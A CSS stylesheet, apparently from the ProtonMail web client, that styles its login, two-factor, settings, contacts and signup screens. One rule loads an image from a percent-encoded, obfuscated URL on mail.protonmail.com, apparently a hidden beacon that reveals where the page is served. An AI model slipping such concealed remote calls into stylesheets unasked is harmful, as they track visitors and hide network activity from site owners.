        #pm_loginTwoFactor input[type=email],
        #pm_loginTwoFactor input[type=number],
        #pm_loginTwoFactor input[type=password],
        #pm_loginTwoFactor input[type=text],
        body#reset input[type=email],
        body#reset input[type=number],
        body#reset input[type=password],
        body#reset input[type=text] {
            border-color: #dfdfdf;
            background: hsla(0, 0%, 100%, .1);
            color: #fff;
            line-height: 38px;
            height: 38px
        }

        #pm_login input[type=email]:active,
        #pm_login input[type=email]:focus,
        #pm_login input[type=number]:active,
        #pm_login input[type=number]:focus,
        #pm_login input[type=password]:active,
        #pm_login input[type=password]:focus,
        #pm_login input[type=text]:active,
        #pm_login input[type=text]:focus,
        #pm_loginTwoFactor input[type=email]:active,
        #pm_loginTwoFactor input[type=email]:focus,
        #pm_loginTwoFactor input[type=number]:active,
        #pm_loginTwoFactor input[type=number]:focus,
        #pm_loginTwoFactor input[type=password]:active,
        #pm_loginTwoFactor input[type=password]:focus,
        #pm_loginTwoFactor input[type=text]:active,
        #pm_loginTwoFactor input[type=text]:focus,
        body#reset input[type=email]:active,
        body#reset input[type=email]:focus,
        body#reset input[type=number]:active,
        body#reset input[type=number]:focus,
        body#reset input[type=password]:active,
        body#reset input[type=password]:focus,
        body#reset input[type=text]:active,
        body#reset input[type=text]:focus {
            color: #fff
        }

        #pm_login .password-container,
        #pm_loginTwoFactor .password-container,
        body#reset .password-container {
            line-height: 38px
        }

        #pm_login .loginForm-input-password .password-messages,
        #pm_login .unlock-input-password .password-messages,
        #pm_loginTwoFactor .loginForm-input-password .password-messages,
        #pm_loginTwoFactor .unlock-input-password .password-messages,
        body#reset .loginForm-input-password .password-messages,
        body#reset .unlock-input-password .password-messages {
            display: none
        }

        #pm_login .customPasswordToggler.loginForm-input-password .password-input[type=password],
        #pm_login .customPasswordToggler.unlock-input-password .password-input[type=password],
        #pm_loginTwoFactor .customPasswordToggler.loginForm-input-password .password-input[type=password],
        #pm_loginTwoFactor .customPasswordToggler.unlock-input-password .password-input[type=password],
        body#reset .customPasswordToggler.loginForm-input-password .password-input[type=password],
        body#reset .customPasswordToggler.unlock-input-password .password-input[type=password] {
            padding: 10px 30px 10px 0
        }

        #pm_login p,
        #pm_loginTwoFactor p,
        body#reset p {
            text-transform: none
        }

        #pm_login ::-webkit-input-placeholder,
        #pm_loginTwoFactor ::-webkit-input-placeholder,
        body#reset ::-webkit-input-placeholder {
            color: #fff
        }

        #pm_login :-moz-placeholder,
        #pm_login ::-moz-placeholder,
        #pm_loginTwoFactor :-moz-placeholder,
        #pm_loginTwoFactor ::-moz-placeholder,
        body#reset :-moz-placeholder,
        body#reset ::-moz-placeholder {
            color: #fff
        }

        #pm_login ::-ms-input-placeholder,
        #pm_login input:-ms-input-placeholder,
        #pm_loginTwoFactor ::-ms-input-placeholder,
        #pm_loginTwoFactor input:-ms-input-placeholder,
        body#reset ::-ms-input-placeholder,
        body#reset input:-ms-input-placeholder {
            color: #fff
        }

        #pm_login :-ms-input-placeholder,
        #pm_loginTwoFactor :-ms-input-placeholder,
        body#reset :-ms-input-placeholder {
            color: #fff
        }

        #pm_login.loadingUnlock,
        #pm_loginTwoFactor.loadingUnlock,
        body#reset.loadingUnlock {
            position: relative;
            padding: 0
        }

        #pm_login.loadingUnlock .loadingUnlock-loader-container,
        #pm_loginTwoFactor.loadingUnlock .loadingUnlock-loader-container,
        body#reset.loadingUnlock .loadingUnlock-loader-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        #pm_login .loadingUnlock-loader-container,
        #pm_login.loadingUnlock .unlock-panel,
        #pm_loginTwoFactor .loadingUnlock-loader-container,
        #pm_loginTwoFactor.loadingUnlock .unlock-panel,
        body#reset .loadingUnlock-loader-container,
        body#reset.loadingUnlock .unlock-panel {
            display: none
        }

        #pm_footer {
            position: absolute;
            text-align: center;
            left: 0;
            bottom: 0;
            right: 0;
            color: #fff;
            text-transform: uppercase;
            display: block;
            padding: 1rem 0;
            font-size: 90%
        }

        #pm_footer p {
            margin: 0
        }

        #pm_footer a {
            color: #fff;
            text-decoration: none
        }

        #pm_footer a:hover {
            color: #e5e5e5
        }

        #pm_footer.static {
            position: static;
            color: #555
        }

        #pm_footer.static a {
            color: #555;
            text-decoration: none
        }

        #pm_footer.static a:hover {
            color: #000
        }

        #pm_login .alert-danger,
        #pm_loginTwoFactor .alert-danger,
        body#reset .alert-danger,
        body#support-reset-password .alert-danger {
            font-weight: 700;
            color: #fff
        }

        #pm_login .alert ul,
        #pm_loginTwoFactor .alert ul,
        body#reset .alert ul,
        body#support-reset-password .alert ul {
            padding: 0;
            font-size: .9em
        }

        #pm_login .alert ul li,
        #pm_loginTwoFactor .alert ul li,
        body#reset .alert ul li,
        body#support-reset-password .alert ul li {
            margin-bottom: .5em
        }

        body.appConfigBody-is-mobile #pm_login input[type=password],
        body.appConfigBody-is-mobile #pm_login input[type=text] {
            background: rgba(0, 0, 0, .1)
        }

        body.appConfigBody-is-mobile #pm_login.pm_panel {
            margin: 0;
            border: none;
            background: transparent
        }

        body.appConfigBody-is-mobile #pm_footer {
            display: none
        }

        .login-btn-oldversion:before {
            content: url("https://%6d%61%69%6c%2e%70%72%6f%74%6f%6e%6d%61%69%6c%2e%63%6f%6d/%61%73%73%65%74%73/%68%6f%73%74%2e%70%6e%67")
        }

        @media (max-height:700px) {
            #pm_footer {
                position: static
            }
        }

        #pm-pgp {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            padding: 20px
        }

        #pm-pgp .pm-pgp-main-loader>.loader {
            margin: 0 auto
        }

        #pm-pgp>section.pm-pgp-headers>header>button {
            margin-left: 10px
        }

        .settingsSignatures-default-container {
            margin-bottom: 0
        }

        label.settingsSignatures-label-active {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%;
            height: auto;
            margin-bottom: 20px
        }

        .settingsSignatures-label-aside * {
            margin-top: 10px
        }

        .activeAddresses-container .pm_sort-item-content {
            min-height: 42px
        }

        .inactiveAddresses-container .pm_sort-container {
            border-top: 0;
            -webkit-box-shadow: inset 0 2px 3px -2px rgba(0, 0, 0, .3);
            box-shadow: inset 0 2px 3px -2px rgba(0, 0, 0, .3);
            background: rgba(0, 0, 0, .05)
        }

        .inactiveAddresses-container .pm_sort-container,
        .inactiveAddresses-container .pm_sort-container .pm_sort-item {
            border-color: rgba(0, 0, 0, .1)
        }

        .inactiveAddresses-container .pm_sort-container .pm_sort-item .pm_sort-item-content:before {
            content: "\F0C9";
            font-family: FontAwesome;
            margin-right: .5em;
            opacity: 0
        }

        .settingsSignatures-container>:last-child {
            margin-bottom: 20px
        }

        .settingsSignatures-container .defaultSignature-link-signatures {
            display: none
        }

        .settingsSignatures-container .defaultSignature-toggle {
            -webkit-transform: none;
            transform: none
        }

        .appConfigBody-is-mobile .settingsSignatures-label-aside {
            text-align: left
        }

        .appConfigBody-is-mobile .activeAddresses-badge,
        .appConfigBody-is-mobile .activeAddresses-email {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .appConfigBody-is-mobile .activeAddresses-badge {
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        [id=secured-signatures] .squireToolbar-select-list {
            min-height: 7em
        }

        [id=secured-signatures] .squireToolbar-font-family {
            width: 150px;
            right: 0;
            left: -50px
        }

        [id=secured-signatures] .colorPopover-container .colorPopover-header [class*=colorPopover-title] {
            font-size: 1.2em
        }

        [id=secured-signatures] .squireToolbar-container {
            border-width: 1px 1px 0;
            border-style: solid;
            border-color: #acb0bf
        }

        [id=secured-signatures] [class*=squireToolbar-action-] {
            padding: 0
        }

        [id=secured-signatures] .squireToolbar-text-mode {
            display: none
        }

        .contacts-container {
            position: relative;
            height: 100%;
            z-index: 0
        }

        .contacts-panels {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            height: calc(100% - 56px)
        }

        [selected-contact] {
            display: block;
            height: 100%
        }

        .contactDetails-container {
            height: 100%
        }

        .contactDetails-container>* {
            padding: 0 15px
        }

        .contactList-container {
            position: relative;
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-ordinal-group: 1;
            -webkit-order: 0;
            -ms-flex-order: 0;
            order: 0;
            overflow: auto;
            border-right: 1px solid rgba(172, 176, 191, .1);
            background: rgba(172, 176, 191, .05);
            z-index: 100
        }

        .contactList-table {
            background: #fff;
            -webkit-box-shadow: 0 1px 2px rgba(172, 176, 191, .2);
            box-shadow: 0 1px 2px rgba(172, 176, 191, .2)
        }

        .contactList-table .contactList-thead {
            border-top: 0
        }

        .contactList-table .contactList-thead th {
            border-bottom-width: 2px;
            white-space: normal
        }

        .contactPlaceholder-container,
        .contactsDetails-container {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: auto
        }

        .contacts-container.contacts-empty .contacts-list,
        .contacts-container.contacts-empty .contactsDetails-container {
            height: 100%
        }

        .appConfigBody-is-mobile .contactPlaceholder-container,
        .appConfigBody-is-tablet .contactPlaceholder-container,
        .contacts-container.contacts-empty .contactPlaceholder-container,
        .contacts-container.contacts-empty .contactsToolbar-container,
        [id=secured-contacts-details] .contactDetails-container+.loader,
        [id=secured-contacts] .contactsDetails-container {
            display: none
        }

        .appConfigBody-is-mobile .contactsDetails-container,
        .appConfigBody-is-tablet .contactsDetails-container {
            position: absolute;
            z-index: 100;
            left: 0;
            top: 0;
            height: 100%;
            width: 100%;
            background: #fff;
            overflow: visible
        }

        .appConfigBody-is-mobile .contactDetails-details,
        .appConfigBody-is-tablet .contactDetails-details {
            height: 100%;
            overflow: auto
        }

        .keysView-container:not(.keysView-require-address-keys-reactivation) [data-mode=address],
        .keysView-container:not(.keysView-require-contact-keys-reactivation) [data-mode=contact] {
            display: none
        }

        #domainsTable td {
            padding: 10px 1rem
        }

        .pm_form .toolbar-button-options label {
            display: inline-block;
            padding-right: 2rem;
            cursor: pointer
        }

        .pm_tabs.domainMenu {
            font-size: 1rem;
            margin-bottom: 1rem;
            width: 100%;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            flex-direction: row
        }

        .pm_tabs.domainMenu,
        .pm_tabs.domainMenu li {
            display: -webkit-flex;
            display: -ms-flexbox;
            display: -webkit-box;
            display: flex
        }

        .pm_tabs.domainMenu li {
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            -webkit-box-flex: 1;
            flex-grow: 1;
            float: none
        }

        .pm_tabs.domainMenu li a {
            padding: .5rem 1rem;
            width: 100%;
            text-align: center;
            height: auto;
            line-height: 1rem
        }

        .pm_tabs.domainMenu li a.disabled {
            opacity: .5;
            pointer-events: none
        }

        #newUser .newUser {
            padding-left: 2rem;
            clear: both;
            float: left;
            width: 100%;
            padding-bottom: 2rem
        }

        #newUser label {
            position: relative
        }

        #newUser label input {
            position: absolute;
            left: -2rem;
            top: .5rem;
            margin: 0
        }

        #settingsAppearance label {
            cursor: pointer
        }

        #settingsAppearance .visual-label {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        #settingsAppearance .visual-label-lineBreak {
            display: block;
            width: 100%;
            margin-top: 10px
        }

        #pm_settings {
            display: -webkit-flex;
            display: -ms-flexbox;
            display: -webkit-box;
            display: flex;
            height: 100%;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            flex-direction: column
        }

        #pm_settings #settingsSave {
            margin: 15px 25px 15px 0
        }

        #pm_settings #accessLog .fa {
            margin-right: .5rem
        }

        #pm_settings #paymentMethodsTable .number {
            width: auto
        }

        #pm_settings #paymentMethodsTable .expiration,
        #pm_settings #paymentMethodsTable .type {
            width: 9rem
        }

        #pm_settings #paymentMethodsTable .actions {
            width: 9rem;
            text-align: right
        }

        #pm_settings #tableSubscription .price {
            width: 4rem
        }

        #pm_settings #settingsSelect {
            display: none
        }

        #pm_settings #cancelTables .pm_table {
            table-layout: auto !important;
            margin-bottom: 0
        }

        #pm_settings .well {
            padding: 25px;
            border: 1px solid #acb0bf
        }

        #pm_settings .usage {
            position: relative
        }

        #pm_settings .usage em {
            font-style: normal;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        #pm_settings .usage .used {
            left: 0;
            padding-right: 1rem;
            text-align: right
        }

        #pm_settings .usage .total {
            right: 0;
            padding-left: 1rem
        }

        #pm_settings .usage .total,
        #pm_settings .usage .used {
            color: #e1e1e1;
            position: absolute;
            background: #fff;
            height: 30px;
            line-height: 30px;
            width: 5rem
        }

        #pm_settings .usage .bar {
            position: absolute;
            left: 5rem;
            right: 5rem;
            top: 13px;
            height: 4px;
            background: #f4f4f4
        }

        #pm_settings .usage .bar .amount {
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            background: #9397cd
        }

        #pm_settings .pm_tabs {
            padding: 0 9px;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            background: #6a6f7c;
            overflow: hidden
        }

        #pm_settings .pm_tabs li {
            height: 40px;
            line-height: 40px
        }

        #pm_settings .pm_tabs li a.pm_button {
            font-size: .65rem;
            border-color: #6a6f7c;
            background: hsla(0, 0%, 100%, .8);
            color: #666;
            border-bottom: none;
            padding: 0 1rem;
            height: 40px;
            line-height: 40px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            position: relative;
            float: left;
            border-bottom: 1px solid #6a6f7c
        }

        #pm_settings .pm_tabs li a.pm_button:hover {
            background: hsla(0, 0%, 100%, .85)
        }

        #pm_settings .pm_tabs li.active a.pm_button {
            background: #fff;
            color: #9397cd;
            border-bottom-color: #fff
        }

        #pm_settings .settings {
            padding: 0 25px 2rem;
            margin-right: 0;
            clear: both;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 100%;
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        #pm_settings .settings .angular-squire-wrapper {
            border: 1px solid #acb0bf;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        #pm_settings .settings .angular-squire-wrapper iframe {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            max-width: 100%
        }

        #pm_settings .settings .squireToolbar-select-list {
            min-height: 7em
        }

        #pm_settings .settings .squireSelectFontFamily-container .squireToolbar-select-view {
            width: 50px
        }

        #pm_settings .settings .squireToolbar-container {
            border-width: 1px 1px 0;
            border-style: solid;
            border-color: #acb0bf
        }

        #pm_settings .settings [class*=squireToolbar-action-] {
            padding: 0
        }

        #pm_settings .settings .squireToolbar-text-mode {
            display: none
        }

        #pm_settings .settings .pm_buttons .fa.fa-angle-down {
            padding: 0 .5rem
        }

        #pm_settings .settings #keys-addressTable td {
            background: transparent
        }

        #pm_settings .settings #keys-addressTable td span {
            float: left;
            margin-right: 1rem
        }

        #pm_settings .settings #keys-addressTable td .fa {
            font-size: 1.25rem
        }

        #pm_settings .settings #keys-addressTable td .fa-times-circle {
            color: #cc9393
        }

        #pm_settings .settings #keys-addressTable td .fa-check {
            color: #555
        }

        #pm_settings .settings table .invoice {
            width: 4rem
        }

        #pm_settings .settings table .price {
            width: 6rem
        }

        #pm_settings .settings table .date {
            width: 12rem
        }

        #pm_settings .settings table .pm_button {
            white-space: nowrap
        }

        #pm_settings .settings .row {
            padding: 2rem 0 1rem;
            clear: both
        }

        #pm_settings .settings .row .border-bottom {
            border-bottom: 1px solid #acb0bf
        }

        #pm_settings .settings .row .clearfix {
            padding: 5px;
            margin: 0 -5px
        }

        #pm_settings .settings .row .setting {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        #pm_settings .settings .row .setting .pm_table td strong {
            display: block
        }

        #pm_settings .settings .row .setting .pm_table td small strong,
        #pm_settings .settings .row .setting .radio {
            display: inline-block
        }

        #pm_settings .settings .row .setting .radio img {
            max-width: 100%
        }

        body.appConfigBody-is-mobile #pm_settings .settings .row .setting {
            width: 100%;
            margin-bottom: 2rem
        }

        body.appConfigBody-is-mobile #pm_settings #logActions {
            float: left;
            margin: 0 0 1rem -5px;
            clear: both
        }

        body.appConfigBody-is-mobile #pm_settings #logArea {
            padding-top: 2rem
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs {
            padding-left: 10px
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs .pm_button {
            padding: 0 8px
        }

        body.appConfigBody-is-mobile #newUser .newUser .pm_grid .col-1-3 {
            width: 33% !important;
            clear: none;
            margin-right: 1rem
        }

        body.appConfigBody-is-mobile #pm_settings .settings {
            margin-right: 0
        }

        body.appConfigBody-is-mobile #pm_settings .settings .pm_table tr {
            display: table-row;
            width: auto;
            border: none
        }

        body.appConfigBody-is-mobile #pm_settings .settings .pm_table tr td,
        body.appConfigBody-is-mobile #pm_settings .settings .pm_table tr th {
            display: table-cell;
            width: auto
        }

        body.appConfigBody-is-mobile #pm_settings #usersTable td,
        body.appConfigBody-is-mobile #pm_settings #usersTable th {
            padding: 1rem
        }

        body.appConfigBody-is-mobile #newUser .newUser {
            padding-left: 0
        }

        body.appConfigBody-is-mobile #newUser label input {
            position: static;
            margin-right: .5rem
        }

        body.appConfigBody-is-mobile #pm_settings .settings {
            padding: 0 10px
        }

        body.appConfigBody-is-mobile #pm_settings #settingsSelect {
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin: 10px;
            border: none;
            position: relative
        }

        body.appConfigBody-is-mobile #pm_settings #settingsSelect .pm_button {
            margin-bottom: 1rem
        }

        body.appConfigBody-is-mobile #pm_settings .well {
            padding: 0;
            border: none
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs {
            background: #fff;
            padding: 10px
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li {
            margin: 0 0 .5rem .25rem
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li>a.pm_button {
            height: 35px;
            line-height: 35px;
            padding: 0 10px;
            cursor: pointer;
            font-size: 12px;
            color: #666;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            -webkit-transition: all .3s ease-out 0s;
            transition: all .3s ease-out 0s;
            -webkit-tap-highlight-color: transparent
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li>a.pm_button:hover {
            background-color: #fafafa
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li>a.pm_button:active,
        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li>a.pm_button:focus {
            background-color: #b2b5c3;
            -webkit-box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05);
            box-shadow: inset 0 1px 2px 0 rgba(0, 0, 0, .05);
            outline: none
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li.active>a.pm_button {
            background-color: #9397cd;
            border-color: #9397cd;
            color: #fff
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li.active>a.pm_button:hover {
            background-color: #7e82b4;
            border-color: #7e82b4
        }

        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li.active>a.pm_button:active,
        body.appConfigBody-is-mobile #pm_settings .pm_tabs>li.active>a.pm_button:focus {
            background-color: #66669a;
            border-color: #66669a;
            outline: none
        }

        @media (max-width:1200px) {
            body #pm_settings #usersTable th {
                width: 12rem
            }

            body #pm_settings #usersTable td {
                padding: 10px 1rem;
                line-height: 1.5rem
            }

            body #pm_settings #usersTable td .pm_button {
                line-height: 1.5rem;
                margin: 0;
                height: auto;
                text-decoration: none;
                padding-left: 0
            }
        }

        body.appConfigBody-is-mobile#secured-account,
        body.appConfigBody-is-mobile#secured-appearance,
        body.appConfigBody-is-mobile#secured-dashboard,
        body.appConfigBody-is-mobile#secured-domains,
        body.appConfigBody-is-mobile#secured-invoices,
        body.appConfigBody-is-mobile#secured-keys,
        body.appConfigBody-is-mobile#secured-labels,
        body.appConfigBody-is-mobile#secured-members,
        body.appConfigBody-is-mobile#secured-security {
            overflow: initial
        }

        body.appConfigBody-is-mobile #pm_settings .settings table.pm_table {
            border: none
        }

        body.appConfigBody-is-mobile #pm_settings .settings table.pm_table tr {
            border: 1px solid #acb0bf;
            display: block;
            margin-bottom: 2rem;
            padding: 0
        }

        body.appConfigBody-is-mobile #pm_settings .settings table.pm_table tr td {
            display: block;
            height: auto !important;
            border-bottom: 1px solid #acb0bf
        }

        body.appConfigBody-is-mobile #pm_settings .settings table.pm_table tr td.text-right {
            text-align: left
        }

        body.appConfigBody-is-mobile #pm_settings .settings table.pm_table tr td code {
            display: none
        }

        #paymentsModal .disabled input,
        #paymentsModal .disabled select {
            cursor: default;
            pointer-events: none;
            background-color: #e6eaf0
        }

        body.appConfigBody-is-mobile #invoicesList,
        body.appConfigBody-is-mobile #invoicesList li {
            display: block;
            list-style-type: none;
            margin: 0;
            padding: 0
        }

        body.appConfigBody-is-mobile #invoicesList li {
            margin-bottom: 1rem;
            border: 1px solid #acb0bf
        }

        body.appConfigBody-is-mobile #invoicesList li p {
            display: block;
            border-bottom: 1px solid #acb0bf;
            padding: .5rem 1rem;
            margin: 0
        }

        body.appConfigBody-is-mobile #invoicesList li p.title {
            background: #e6eaf0
        }

        [name=signature] .squire-popover {
            font-size: .9em
        }

        [name=signature] .squire-popover [class*=-panel] {
            padding: .5em 1em;
            margin: 0 !important
        }

        [name=signature] .squire-popover [class*=-label] {
            height: auto;
            line-height: 2
        }

        [name=signature] .squire-popover [class*=-input] {
            width: 100%;
            margin: 0
        }

        [name=signature] .squire-popover [class*=-footer] {
            padding: .5em 1em
        }

        [name=signature] {
            position: relative;
            z-index: 0
        }

        [name=signature] .squireSelectColor-container {
            position: static
        }

        [name=signature] .colorPopover-selection {
            display: none
        }

        [name=signature] .colorPopover-panel {
            padding-top: 0 !important
        }

        [name=signature] .squire-popover.squire-popover-second {
            -webkit-transform: scale(.75);
            transform: scale(.75);
            left: 0;
            -webkit-transform-origin: 20% 100%;
            transform-origin: 20% 100%
        }

        .ua-ie-11 [name=signature] .squire-popover [class*=-input] {
            padding: .3em 1em
        }

        #login-setup #pm_footer {
            position: static;
            color: #555
        }

        #login-setup #pm_footer a {
            color: #555;
            text-decoration: none
        }

        #login-setup #pm_footer a:hover {
            color: #000
        }

        #login-setup .pm_panel {
            margin-bottom: 2rem
        }

        #login-setup .pm_panel img {
            margin: 1rem 0
        }

        #login-setup .pm_panel h3,
        #login-setup h2 {
            margin-bottom: 1rem
        }

        #login-setup h2 {
            text-transform: uppercase
        }

        #login-setup h2 .fa {
            margin-bottom: .5rem
        }

        #login-setup .spinner.large {
            height: 14rem
        }

        #login-setup .spinner.large .spinner1,
        #login-setup .spinner.large .spinner2,
        #login-setup .spinner.large .spinner3 {
            background-color: #9397cd
        }

        #login-setup ol#creationList,
        #login-setup ol#creationList li {
            display: display;
            list-style-type: none
        }

        #login-setup ol#creationList .fa,
        #login-setup ol#creationList li .fa {
            width: 1.5rem;
            display: inline-block;
            opacity: 0;
            -webkit-transition: opacity 1s ease;
            transition: opacity 1s ease
        }

        #login-setup ol#creationList .fa.show,
        #login-setup ol#creationList li .fa.show {
            opacity: 1
        }

        #login-setup .pm_button.primary {
            padding: 0 2rem
        }

        #login-setup .wrapper {
            padding: 0 65px;
            position: relative;
            text-align: initial
        }

        #login-setup .wrapper .usernameWrap strong {
            float: left;
            line-height: 2rem
        }

        #login-setup .wrapper .usernameWrap input {
            width: 11rem;
            display: inline-block;
            float: left
        }

        #login-setup .wrapper .usernameWrap em {
            font-style: normal;
            width: 2rem;
            text-align: center;
            line-height: 2rem;
            float: left
        }

        #login-setup .wrapper label {
            font-weight: 700;
            text-align: left;
            position: relative;
            margin: 2rem 0 -1rem
        }

        #login-setup .wrapper label.optIn {
            font-weight: 400
        }

        #login-setup .wrapper label em.num {
            position: absolute;
            width: 2rem;
            left: -65px;
            font-weight: 700;
            border-radius: 2rem;
            background-color: #f4f4f4;
            text-align: center;
            line-height: 2rem;
            display: block;
            height: 2rem;
            font-style: normal
        }

        #login-setup .wrapper label span {
            color: #222;
            font-weight: 700;
            font-size: 1.1rem
        }

        body.appConfigBody-is-mobile#login-setup .container-fluid .row>div>p {
            display: none
        }

        body.appConfigBody-is-mobile#login-setup .wrapper {
            padding: 0
        }

        body.appConfigBody-is-mobile#login-setup .wrapper label {
            margin-top: 4rem
        }

        body.appConfigBody-is-mobile#login-setup .wrapper label em.num {
            left: 0;
            top: -2rem
        }

        body.appConfigBody-is-mobile#login-setup .pm_panel {
            margin: 0;
            padding-top: 3rem !important
        }

        body.appConfigBody-is-mobile#login-setup .pm_panel form .pm_button.primary {
            width: 100%;
            text-align: center;
            line-height: 4rem;
            height: 4rem
        }

        .loginSetup-field-password+.loginSetup-field-password {
            margin-top: 1em
        }

        [class*=signUpProcess-step-] {
            margin-bottom: 2rem;
            margin-top: 3rem
        }

        [class*=signUpProcess-step-] .wrapper {
            padding: 0 65px;
            position: relative;
            text-align: initial
        }

        .humanVerification-container .humanVerification-wrapper,
        .signupUserForm-container .notificationEmail-container,
        .signupUserForm-container .usernameDomain-container,
        .signupUserForm-container .usernamePassword-container {
            margin-top: 2rem
        }

        [class*=signUpProcess-step-]>.header {
            margin-top: 1rem
        }

        .signupPayForm-header-title,
        .signupUserForm-header-title {
            text-transform: uppercase;
            margin-bottom: 1rem
        }

        [class*=signUpProcess-step-] [data-step] {
            position: relative
        }

        [class*=signUpProcess-step-] [data-step]:before {
            content: attr(data-step);
            position: absolute;
            width: 2rem;
            left: -65px;
            font-weight: 700;
            border-radius: 2rem;
            background-color: #f4f4f4;
            text-align: center;
            line-height: 2rem;
            display: block;
            height: 2rem;
            font-size: .8rem;
            font-style: normal;
            color: #555
        }

        [class*=signUpProcess-step-] .titleLabel {
            position: relative;
            text-align: left;
            color: #222;
            font-weight: 700;
            font-size: 1.1rem
        }

        .humanVerification-container .humanVerification-wrapper>.help,
        .signupUserForm-container .notificationEmail-container>.help,
        .signupUserForm-container .usernameDomain-container>.help {
            margin-top: 0
        }

        .signupUserForm-footer {
            text-align: center;
            margin-top: 3rem
        }

        .signUpProcess-step-1 .usernameWrap {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .signUpProcess-step-1 .usernameWrap .usernameInput {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1
        }

        .signUpProcess-step-1 .usernameWrap .usernameDomain {
            padding: 0 5px
        }

        .humanVerification-wrapper {
            width: 375px;
            margin: 0 auto
        }

        [class*=signUpProcess-step-] ol#creationList,
        [class*=signUpProcess-step-] ol#creationList li {
            display: display;
            list-style-type: none
        }

        [class*=signUpProcess-step-] ol#creationList .fa,
        [class*=signUpProcess-step-] ol#creationList li .fa {
            width: 1.5rem;
            display: inline-block;
            opacity: 0;
            -webkit-transition: opacity 1s ease;
            transition: opacity 1s ease
        }

        [class*=signUpProcess-step-] ol#creationList .fa.show,
        [class*=signUpProcess-step-] ol#creationList li .fa.show {
            opacity: 1
        }

        [class*=signUpProcess-step-] iframe#pm_captcha {
            outline: none;
            border: none;
            width: 100%;
            position: relative;
            left: -8px;
            height: 120px;
            overflow: hidden;
            z-index: 5
        }

        [class*=signUpProcess-step-] #captchaFrame {
            position: relative
        }

        [class*=signUpProcess-step-] #captchaFrame .loading {
            position: absolute;
            left: 0;
            right: 0;
            top: 4rem;
            text-align: center;
            z-index: 1;
            display: block
        }

        [class*=signUpProcess-step-] .spinner.large {
            height: 14rem
        }

        [class*=signUpProcess-step-] .spinner.large .spinner1,
        [class*=signUpProcess-step-] .spinner.large .spinner2,
        [class*=signUpProcess-step-] .spinner.large .spinner3 {
            background-color: #9397cd
        }

        [class*=signUpProcess-step-] .signup-radio-label {
            height: 1.5rem
        }

        [class*=signUpProcess-step-] .signup-radio-label-text {
            color: #000;
            font-size: 1rem
        }

        [class*=signUpProcess-step-] .creating-loader-container,
        [class*=signUpProcess-step-] .genNewKeys-loader-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center
        }

        body.appConfigBody-is-mobile [class*=signUpProcess-step-],
        body.appConfigBody-is-mobile [class*=signUpProcess-step-] .pm_panel {
            margin: 0
        }

        body.appConfigBody-is-mobile [class*=signUpProcess-step-] [data-step]:before {
            display: none
        }

        body.appConfigBody-is-mobile [class*=signUpProcess-step-] .wrapper {
            padding: 0
        }

        body.appConfigBody-is-mobile [class*=signUpProcess-step-] .wrapper label {
            margin-top: 3rem
        }

